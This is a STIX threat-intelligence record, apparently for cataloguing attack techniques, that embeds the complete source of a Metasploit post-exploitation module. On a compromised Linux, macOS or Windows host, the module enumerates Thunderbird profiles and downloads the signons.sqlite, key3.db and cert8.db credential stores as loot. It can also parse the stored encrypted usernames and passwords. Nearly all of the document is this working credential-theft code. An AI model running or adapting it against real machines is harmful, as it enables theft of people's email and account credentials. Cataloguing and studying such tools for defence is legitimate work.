{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5d8e612b-d75b-4fd0-9e35-1092600a0c6d",
    "created": "2024-08-14T16:33:19.161506Z",
    "modified": "2024-08-14T16:33:19.16151Z",
    "name": "Multi Gather Mozilla Thunderbird Signon Credential Collection",
    "description": " This module will collect credentials from Mozilla Thunderbird by downloading the necessary files such as 'signons.sqlite', 'key3.db', and 'cert8.db' for offline decryption with third party tools.  If necessary, you may also set the PARSE option to true to parse the sqlite file, which contains sensitive information such as the encrypted username/password. However, this feature is not enabled by default, because it requires SQLITE3 gem to be installed on your machine.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/gather/thunderbird_creds.rb",
            "external_id": "thunderbird_creds.rb"
        },
        {
            "source_name": "row3",
            "external_id": "#formSubmitURL(couldbenil)"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Windows::UserProfiles\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Multi Gather Mozilla Thunderbird Signon Credential Collection',\n        'Description' => %q{\n          This module will collect credentials from Mozilla Thunderbird by downloading\n          the necessary files such as 'signons.sqlite', 'key3.db', and 'cert8.db' for\n          offline decryption with third party tools.\n\n          If necessary, you may also set the PARSE option to true to parse the sqlite\n          file, which contains sensitive information such as the encrypted username/password.\n          However, this feature is not enabled by default, because it requires SQLITE3 gem\n          to be installed on your machine.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'sinn3r', # Metasploit\n        ],\n        'Platform' => %w[linux osx win],\n        'SessionTypes' => ['meterpreter', 'shell'],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_channel_eof\n              core_channel_open\n              core_channel_read\n              core_channel_write\n              stdapi_sys_config_getenv\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptBool.new('PARSE', [false, 'Use SQLite3 to parse the database', false])\n      ]\n    )\n  end\n\n  def run\n    # Initialize Thunderbird's base path based on the platform\n    case session.platform\n    when 'linux'\n      user = session.shell_command('whoami').chomp\n      base = \"/home/#{user}/.thunderbird/\"\n    when 'osx'\n      user = session.shell_command('whoami').chomp\n      base = \"/Users/#{user}/Library/Thunderbird/Profiles/\"\n    when 'windows'\n      if session.type == 'meterpreter'\n        user_profile = session.sys.config.getenv('APPDATA')\n      else\n        user_profile = cmd_exec('echo %APPDATA%').strip\n      end\n      base = user_profile + '\\\\Thunderbird\\\\Profiles\\\\'\n    end\n\n    # Now we have the path for Thunderbird, we still need to enumerate its\n    # random profile names.\n    print_status(\"Looking for profiles in #{base}...\")\n    profiles = get_profile_names(base)\n\n    # Steal!\n    profiles.each do |profile|\n      next if profile =~ /^\\./\n\n      slash = (session.platform == 'windows') ? '\\\\' : '/'\n      p = base + profile + slash\n\n      # Download the database, and attempt to process the content\n      download_loot(p)\n    end\n  end\n\n  #\n  # Download signons.sqlite and key3.db.\n  # The routine will attempt to parse the sqlite db if the PARSE option is true,\n  # and that SQLite3 is installed on the user's box.\n  #\n  def download_loot(p)\n    # These are the files we wanna grab for the directory for future decryption\n    files = ['signons.sqlite', 'key3.db', 'cert8.db']\n\n    files.each do |item|\n      loot = ''\n\n      # Downaload the file\n      if session.type == 'meterpreter'\n        vprint_status(\"Downloading: #{p + item}\")\n        begin\n          f = session.fs.file.new(p + item, 'rb')\n          loot << f.read until f.eof?\n        rescue ::Exception => e\n        ensure\n          f.close\n        end\n      elsif session.type == 'shell'\n        cmd_show = (session.platform == 'windows') ? 'type' : 'cat'\n        # The type command will add a 0x0a character in the file?  Pff.\n        # Gotta lstrip that.\n        loot = cmd_exec(cmd_show, \"\\\"#{p + item}\\\"\").lstrip\n        next if loot =~ /system cannot find the file specified|No such file/\n      end\n\n      # Save it\n      ext = ::File.extname(item)\n      ext = ext[1, ext.length]\n\n      path = store_loot(\n        \"tb.#{item}\",\n        \"binary/#{ext}\",\n        session,\n        loot,\n        \"thunderbird_raw_#{item}\",\n        \"Thunderbird Raw File #{item}\"\n      )\n\n      print_status(\"#{item} saved in #{path}\")\n\n      # Parse signons.sqlite\n      next unless item =~ (/signons\\.sqlite/) && datastore['PARSE']\n\n      print_status('Parsing signons.sqlite...')\n      data_tbl = parse(path)\n      if data_tbl.nil? || data_tbl.rows.empty?\n        print_status('No data parsed')\n      else\n        path = store_loot(\n          \"tb.parsed.#{item}\",\n          'text/plain',\n          session,\n          data_tbl.to_csv,\n          \"thunderbird_parsed_#{item}\",\n          \"Thunderbird Parsed File #{item}\"\n        )\n        print_status(\"Parsed signons.sqlite saved in: #{path}\")\n      end\n    end\n  end\n\n  #\n  # Parse the sqlite database.\n  # This thing requires sqlite3 gem, so we don't really recommend it.\n  # The best way is to use railgun, but as of now we don't support that.\n  # Can't just LoadLibrary(\"sqlite3.dll\") or LoadLibrary(\"mozsqlite3.dll\")\n  #\n  def parse(file)\n    begin\n      require 'sqlite3'\n    rescue LoadError\n      print_error(\"Sorry, SQLite3 not available. We'll have to skip the parser.\")\n      return nil\n    end\n\n    # Load the database\n    db = SQLite3::Database.new(file)\n    begin\n      columns, *rows = db.execute('select * from moz_logins')\n    rescue ::Exception => e\n      print_error(\"doh! #{e}\")\n      return nil\n    ensure\n      db.close\n    end\n\n    # Create a rex table to store our data\n    tbl = Rex::Text::Table.new(\n      'Header' => 'Thunderbird login data',\n      'Indent' => 1,\n      'Columns' =>\n        [\n          'hostname',\n          'httpRealm',\n          'formSubmitURL',\n          'usernameField',\n          'passwordField',\n          'encryptedUsername',\n          'encryptedPassword',\n          'guid'\n        ]\n    )\n\n    # Parse the db, store the data\n    rows.each do |row|\n      tbl << [\n        row[1],  # hostname\n        row[2],  # httpRealm\n        row[3],  # formSubmitURL (could be nil)\n        row[4],  # usernameField\n        row[5],  # passwordField\n        row[6],  # encryptedUsername\n        row[7],  # encryptedPassword\n        row[8]   # guid\n      ]\n    end\n\n    return tbl\n  end\n\n  #\n  # Return the profile names based on a base path.\n  # The format for the random profile name goes like: [random].default\n  #\n  def get_profile_names(path)\n    tb_profiles = []\n\n    if session.type == 'meterpreter'\n      session.fs.dir.foreach(path) do |subdir|\n        tb_profiles << subdir\n      end\n    else\n      cmd = (session.platform == 'windows') ? \"dir \\\"#{path}\\\"\" : \"ls -ld #{path}*/\"\n      dir = cmd_exec(cmd)\n      dir.each_line do |line|\n        line = line.strip\n        next if session.platform == 'windows' && line !~ /<DIR>((.+)\\.(\\w+)$)/\n        next if (session.platform == 'linux' || session.platform == 'osx') && line !~ /(\\w+\\.\\w+)/\n\n        tb_profiles << ::Regexp.last_match(1) if !::Regexp.last_match(1).nil?\n      end\n    end\n    return tb_profiles\n  end\nend\n\n=begin\nIf you're really curious about Mozilla's encryption/descryption API, download this:\nftp://ftp.mozilla.org/pub/mozilla.org/thunderbird/releases/8.0/source/\n\nAnd then read the following files:\nmozilla/security/manager/ssl/src/nsSDR.cpp\nmozilla/security/nss/lib/pk11wrap/pk11sdr.c\n\nUsing a 3rd party decryptor is easier because Mozilla uses 2 different databases\n(SQLite and Berkeley DB) to store the crypto information.  This makes proper decryption\nimplementation kind of uneasy, because railgun currently doesn't support SQLite3 and\nBDB (require special handling -- it's not like you can do LoadLibrary('mozsqlite3.dll')\nto load the lib).  Not to mention you need to borrow several more Mozilla components to\ndo the decryption.  BDB gem unfortunately is kind of busted during my testing, so I guess\nwe can pretty much forget about doing the decryption locally... chances are a lot of\nusers would have problems just to get that setup going anyway.\n=end\n",
    "x_mitre_platforms": [
        "%w[linux osx win]"
    ]
}